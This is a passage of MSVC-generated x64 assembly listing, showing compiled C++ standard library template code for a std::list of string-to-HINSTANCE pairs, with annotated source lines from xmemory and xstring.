??$?0V?$_List_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@@std@@_N$0A@@?$pair@V?$_List_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@@std@@_N@std@@QEAA@$$QEAV?$_List_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@@1@$$QEA_N@Z PROC ; std::pair<std::_List_iterator<std::_List_val<std::_List_simple_types<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> > > >,bool>::pair<std::_List_iterator<std::_List_val<std::_List_simple_types<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> > > >,bool><std::_List_iterator<std::_List_val<std::_List_simple_types<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> > > >,bool,0>, COMDAT

; 247  :         : first(_STD forward<_Other1>(_Val1)), second(_STD forward<_Other2>(_Val2)) {

	mov	rax, QWORD PTR [rdx]
	mov	QWORD PTR [rcx], rax
	movzx	eax, BYTE PTR [r8]
	mov	BYTE PTR [rcx+8], al

; 248  :     }

	mov	rax, rcx
	ret	0
??$?0V?$_List_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@@std@@_N$0A@@?$pair@V?$_List_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@@std@@_N@std@@QEAA@$$QEAV?$_List_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@@1@$$QEA_N@Z ENDP ; std::pair<std::_List_iterator<std::_List_val<std::_List_simple_types<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> > > >,bool>::pair<std::_List_iterator<std::_List_val<std::_List_simple_types<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> > > >,bool><std::_List_iterator<std::_List_val<std::_List_simple_types<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> > > >,bool,0>
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory
;	COMDAT ??$destroy@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@?$_Default_allocator_traits@V?$allocator@U?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@std@@@std@@@std@@SAXAEAV?$allocator@U?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@std@@@1@QEAU?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@1@@Z
_TEXT	SEGMENT
__formal$dead$ = 48
_Ptr$ = 56
??$destroy@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@?$_Default_allocator_traits@V?$allocator@U?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@std@@@std@@@std@@SAXAEAV?$allocator@U?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@std@@@1@QEAU?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@1@@Z PROC ; std::_Default_allocator_traits<std::allocator<std::_List_node<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *>,void *> > >::destroy<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> >, COMDAT

; 705  :     static _CONSTEXPR20 void destroy(_Alloc&, _Uty* const _Ptr) {

$LN62:
	push	rbx
	sub	rsp, 32					; 00000020H
	mov	rbx, rdx
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring

; 2244 :         return _Myres > _Small_string_capacity;

	mov	rdx, QWORD PTR [rdx+24]
	cmp	rdx, 15

; 4868 :         if (_My_data._Large_mode_engaged()) {

	jbe	SHORT $LN32@destroy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory

; 950  :         _STD _Deallocate<_New_alignof<_Ty>>(_Ptr, sizeof(_Ty) * _Count);

	mov	rcx, QWORD PTR [rbx]
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring

; 2643 :         _Al.deallocate(_Old_ptr, _Capacity + 1); // +1 for null terminator

	inc	rdx
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory

; 253  :         if (_Bytes >= _Big_allocation_threshold) {

	cmp	rdx, 4096				; 00001000H
	jb	SHORT $LN46@destroy

; 174  :     const uintptr_t _Ptr_container   = _Ptr_user[-1];

	mov	r8, QWORD PTR [rcx-8]
	add	rdx, 39					; 00000027H

; 175  : 
; 176  :     // If the following asserts, it likely means that we are performing
; 177  :     // an aligned delete on memory coming from an unaligned allocation.
; 178  :     _STL_ASSERT(_Ptr_user[-2] == _Big_allocation_sentinel, "invalid argument");
; 179  : 
; 180  :     // Extra paranoia on aligned allocation/deallocation; ensure _Ptr_container is
; 181  :     // in range [_Min_back_shift, _Non_user_size]
; 182  : #ifdef _DEBUG
; 183  :     constexpr uintptr_t _Min_back_shift = 2 * sizeof(void*);
; 184  : #else // ^^^ defined(_DEBUG) / !defined(_DEBUG) vvv
; 185  :     constexpr uintptr_t _Min_back_shift = sizeof(void*);
; 186  : #endif // ^^^ !defined(_DEBUG) ^^^
; 187  :     const uintptr_t _Back_shift = reinterpret_cast<uintptr_t>(_Ptr) - _Ptr_container;

	sub	rcx, r8

; 188  :     _STL_VERIFY(_Back_shift >= _Min_back_shift && _Back_shift <= _Non_user_size, "invalid argument");

	lea	rax, QWORD PTR [rcx-8]
	cmp	rax, 31
	ja	SHORT $LN43@destroy

; 189  :     _Ptr = reinterpret_cast<void*>(_Ptr_container);

	mov	rcx, r8
$LN46@destroy:

; 258  :         ::operator delete(_Ptr, _Bytes);

	call	??3@YAXPEAX_K@Z				; operator delete
$LN32@destroy:
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring

; 4875 :         _My_data._Mysize = 0;

	mov	QWORD PTR [rbx+16], 0

; 4876 :         _My_data._Myres  = _Small_string_capacity;

	mov	QWORD PTR [rbx+24], 15

; 4877 :         // the _Traits::assign is last so the codegen doesn't think the char write can alias this
; 4878 :         _Traits::assign(_My_data._Bx._Buf[0], _Elem());

	mov	BYTE PTR [rbx], 0
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory

; 711  :     }

	add	rsp, 32					; 00000020H
	pop	rbx
	ret	0
$LN43@destroy:

; 188  :     _STL_VERIFY(_Back_shift >= _Min_back_shift && _Back_shift <= _Non_user_size, "invalid argument");

	call	_invalid_parameter_noinfo_noreturn
	int	3
$LN59@destroy:
??$destroy@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@?$_Default_allocator_traits@V?$allocator@U?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@std@@@std@@@std@@SAXAEAV?$allocator@U?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@std@@@1@QEAU?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@1@@Z ENDP ; std::_Default_allocator_traits<std::allocator<std::_List_node<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *>,void *> > >::destroy<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> >
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\type_traits
;	COMDAT ??$forward@AEBV?$_List_unchecked_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@@std@@@std@@YAAEBV?$_List_unchecked_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@@0@AEBV10@@Z
_TEXT	SEGMENT
_Arg$ = 8
??$forward@AEBV?$_List_unchecked_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@@std@@@std@@YAAEBV?$_List_unchecked_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@@0@AEBV10@@Z PROC ; std::forward<std::_List_unchecked_iterator<std::_List_val<std::_List_simple_types<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> > > > const &>, COMDAT

; 1537 :     return static_cast<_Ty&&>(_Arg);

	mov	rax, rcx

; 1538 : }

	ret	0
??$forward@AEBV?$_List_unchecked_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@@std@@@std@@YAAEBV?$_List_unchecked_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@@0@AEBV10@@Z ENDP ; std::forward<std::_List_unchecked_iterator<std::_List_val<std::_List_simple_types<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> > > > const &>
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xutility
;	COMDAT ??$_Construct_in_place@V?$_List_unchecked_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@@std@@AEBV12@@std@@YAXAEAV?$_List_unchecked_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@@0@AEBV10@@Z
_TEXT	SEGMENT
_Obj$ = 8
<_Args_0>$ = 16
??$_Construct_in_place@V?$_List_unchecked_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@@std@@AEBV12@@std@@YAXAEAV?$_List_unchecked_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@@0@AEBV10@@Z PROC ; std::_Construct_in_place<std::_List_unchecked_iterator<std::_List_val<std::_List_simple_types<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> > > >,std::_List_unchecked_iterator<std::_List_val<std::_List_simple_types<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> > > > const &>, COMDAT

; 382  : #if _HAS_CXX20
; 383  :     if (_STD is_constant_evaluated()) {
; 384  :         _STD construct_at(_STD addressof(_Obj), _STD forward<_Types>(_Args)...);
; 385  :     } else
; 386  : #endif // _HAS_CXX20
; 387  :     {
; 388  :         ::new (static_cast<void*>(_STD addressof(_Obj))) _Ty(_STD forward<_Types>(_Args)...);
; 389  :     }
; 390  : }

	mov	rax, QWORD PTR [rdx]
	mov	QWORD PTR [rcx], rax
	ret	0
??$_Construct_in_place@V?$_List_unchecked_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@@std@@AEBV12@@std@@YAXAEAV?$_List_unchecked_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@@0@AEBV10@@Z ENDP ; std::_Construct_in_place<std::_List_unchecked_iterator<std::_List_val<std::_List_simple_types<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> > > >,std::_List_unchecked_iterator<std::_List_val<std::_List_simple_types<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> > > > const &>
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\utility
;	COMDAT ??$exchange@PEAU?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@std@@$$T@std@@YAPEAU?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@0@AEAPEAU10@$$QEA$$T@Z
_TEXT	SEGMENT
_Val$ = 8
_New_val$ = 16
??$exchange@PEAU?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@std@@$$T@std@@YAPEAU?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@0@AEAPEAU10@$$QEA$$T@Z PROC ; std::exchange<std::_List_node<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *>,void *> *,std::nullptr_t>, COMDAT

; 755  :     // assign _New_val to _Val, return previous _Val
; 756  :     _Ty _Old_val = static_cast<_Ty&&>(_Val);
; 757  :     _Val         = static_cast<_Other&&>(_New_val);

	mov	rdx, QWORD PTR [rdx]
	mov	rax, QWORD PTR [rcx]
	mov	QWORD PTR [rcx], rdx

; 758  :     return _Old_val;
; 759  : }

	ret	0
??$exchange@PEAU?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@std@@$$T@std@@YAPEAU?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@0@AEAPEAU10@$$QEA$$T@Z ENDP ; std::exchange<std::_List_node<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *>,void *> *,std::nullptr_t>
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xutility
;	COMDAT ??$_Construct_in_place@PEAU?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@std@@AEBQEAU12@@std@@YAXAEAPEAU?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@0@AEBQEAU10@@Z
_TEXT	SEGMENT
_Obj$ = 8
<_Args_0>$ = 16
??$_Construct_in_place@PEAU?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@std@@AEBQEAU12@@std@@YAXAEAPEAU?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@0@AEBQEAU10@@Z PROC ; std::_Construct_in_place<std::_List_node<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *>,void *> *,std::_List_node<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *>,void *> * const &>, COMDAT

; 382  : #if _HAS_CXX20
; 383  :     if (_STD is_constant_evaluated()) {
; 384  :         _STD construct_at(_STD addressof(_Obj), _STD forward<_Types>(_Args)...);
; 385  :     } else
; 386  : #endif // _HAS_CXX20
; 387  :     {
; 388  :         ::new (static_cast<void*>(_STD addressof(_Obj))) _Ty(_STD forward<_Types>(_Args)...);
; 389  :     }
; 390  : }

	mov	rax, QWORD PTR [rdx]
	mov	QWORD PTR [rcx], rax
	ret	0
??$_Construct_in_place@PEAU?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@std@@AEBQEAU12@@std@@YAXAEAPEAU?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@0@AEBQEAU10@@Z ENDP ; std::_Construct_in_place<std::_List_node<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *>,void *> *,std::_List_node<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *>,void *> * const &>
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory
;	COMDAT ?_Allocate@?$_Alloc_construct_ptr@V?$allocator@U?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@std@@@std@@@std@@QEAAXXZ
_TEXT	SEGMENT
this$ = 48
?_Allocate@?$_Alloc_construct_ptr@V?$allocator@U?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@std@@@std@@@std@@QEAAXXZ PROC ; std::_Alloc_construct_ptr<std::allocator<std::_List_node<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *>,void *> > >::_Allocate, COMDAT

; 1131 :     _CONSTEXPR20 void _Allocate() { // disengage *this, then allocate a new memory block

$LN31:
	push	rbx
	sub	rsp, 32					; 00000020H
	mov	rbx, rcx

; 1132 :         _Ptr = nullptr; // if allocate throws, prevents double-free

	mov	QWORD PTR [rcx+8], 0

; 1133 :         _Ptr = _Al.allocate(1);

	mov	ecx, 56					; 00000038H
	call	??2@YAPEAX_K@Z				; operator new
	mov	QWORD PTR [rbx+8], rax

; 1134 :     }

	add	rsp, 32					; 00000020H
	pop	rbx
	ret	0
?_Allocate@?$_Alloc_construct_ptr@V?$allocator@U?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@std@@@std@@@std@@QEAAXXZ ENDP ; std::_Alloc_construct_ptr<std::allocator<std::_List_node<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *>,void *> > >::_Allocate
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory
;	COMDAT ??0?$_Alloc_construct_ptr@V?$allocator@U?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@std@@@std@@@std@@QEAA@AEAV?$allocator@U?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@std@@@1@@Z
_TEXT	SEGMENT
this$ = 8
_Al_$ = 16
??0?$_Alloc_construct_ptr@V?$allocator@U?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@std@@@std@@@std@@QEAA@AEAV?$allocator@U?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@std@@@1@@Z PROC ; std::_Alloc_construct_ptr<std::allocator<std::_List_node<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *>,void *> > >::_Alloc_construct_ptr<std::allocator<std::_List_node<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *>,void *> > >, COMDAT

; 1125 :     _CONSTEXPR20 explicit _Alloc_construct_ptr(_Alloc& _Al_) : _Al(_Al_), _Ptr(nullptr) {}

	mov	QWORD PTR [rcx], rdx
	mov	rax, rcx
	mov	QWORD PTR [rcx+8], 0
	ret	0
??0?$_Alloc_construct_ptr@V?$allocator@U?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@std@@@std@@@std@@QEAA@AEAV?$allocator@U?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@std@@@1@@Z ENDP ; std::_Alloc_construct_ptr<std::allocator<std::_List_node<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *>,void *> > >::_Alloc_construct_ptr<std::allocator<std::_List_node<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *>,void *> > >
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring
;	COMDAT ?_Equal@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEBA_NAEBV12@@Z
_TEXT	SEGMENT
this$ = 48
_Right$ = 56
?_Equal@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEBA_NAEBV12@@Z PROC ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::_Equal, COMDAT

; 4631 :     _CONSTEXPR20 bool _Equal(const basic_string& _Right) const noexcept {

$LN28:
	sub	rsp, 40					; 00000028H

; 2244 :         return _Myres > _Small_string_capacity;

	cmp	QWORD PTR [rdx+24], 15

; 4632 :         // compare [0, size()) with _Right for equality
; 4633 :         return _Traits_equal<_Traits>(_Mypair._Myval2._Myptr(), _Mypair._Myval2._Mysize,

	mov	rax, QWORD PTR [rdx+16]

; 2236 :         if (_Large_mode_engaged()) {

	jbe	SHORT $LN5@Equal

; 2237 :             _Result = _Unfancy(_Bx._Ptr);

	mov	rdx, QWORD PTR [rdx]
$LN5@Equal:

; 2244 :         return _Myres > _Small_string_capacity;

	cmp	QWORD PTR [rcx+24], 15

; 4632 :         // compare [0, size()) with _Right for equality
; 4633 :         return _Traits_equal<_Traits>(_Mypair._Myval2._Myptr(), _Mypair._Myval2._Mysize,

	mov	r8, QWORD PTR [rcx+16]

; 2236 :         if (_Large_mode_engaged()) {

	jbe	SHORT $LN12@Equal

; 2237 :             _Result = _Unfancy(_Bx._Ptr);

	mov	rcx, QWORD PTR [rcx]
$LN12@Equal:

; 546  :     return _Left_size == _Right_size && _Traits::compare(_Left, _Right, _Left_size) == 0;

	cmp	r8, rax
	jne	SHORT $LN20@Equal

; 379  :         return __builtin_memcmp(_First1, _First2, _Count);

	call	memcmp

; 546  :     return _Left_size == _Right_size && _Traits::compare(_Left, _Right, _Left_size) == 0;

	test	eax, eax
	jne	SHORT $LN20@Equal

; 4632 :         // compare [0, size()) with _Right for equality
; 4633 :         return _Traits_equal<_Traits>(_Mypair._Myval2._Myptr(), _Mypair._Myval2._Mysize,

	mov	al, 1

; 4634 :             _Right._Mypair._Myval2._Myptr(), _Right._Mypair._Myval2._Mysize);
; 4635 :     }

	add	rsp, 40					; 00000028H
	ret	0
$LN20@Equal:

; 4632 :         // compare [0, size()) with _Right for equality
; 4633 :         return _Traits_equal<_Traits>(_Mypair._Myval2._Myptr(), _Mypair._Myval2._Mysize,

	xor	al, al

; 4634 :             _Right._Mypair._Myval2._Myptr(), _Right._Mypair._Myval2._Mysize);
; 4635 :     }

	add	rsp, 40					; 00000028H
	ret	0
?_Equal@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEBA_NAEBV12@@Z ENDP ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::_Equal
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\utility
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\utility
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory
;	COMDAT ??$construct@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@U?$pair@PEBDPEAUHINSTANCE__@@@2@@?$_Default_allocator_traits@V?$allocator@U?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@std@@@std@@@std@@SAXAEAV?$allocator@U?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@std@@@1@QEAU?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@1@$$QEAU?$pair@PEBDPEAUHINSTANCE__@@@1@@Z
_TEXT	SEGMENT
__formal$dead$ = 48
_Ptr$ = 56
<_Args_0>$ = 64
??$construct@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@U?$pair@PEBDPEAUHINSTANCE__@@@2@@?$_Default_allocator_traits@V?$allocator@U?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@std@@@std@@@std@@SAXAEAV?$allocator@U?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@std@@@1@QEAU?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@1@$$QEAU?$pair@PEBDPEAUHINSTANCE__@@@1@@Z PROC ; std::_Default_allocator_traits<std::allocator<std::_List_node<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *>,void *> > >::construct<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *>,std::pair<char const *,HINSTANCE__ *> >, COMDAT

; 696  :     static _CONSTEXPR20 void construct(_Alloc&, _Objty* const _Ptr, _Types&&... _Args) {

$LN10:
	mov	QWORD PTR [rsp+8], rbx
	push	rdi
	sub	rsp, 32					; 00000020H
	mov	rdi, rdx
	mov	rbx, r8
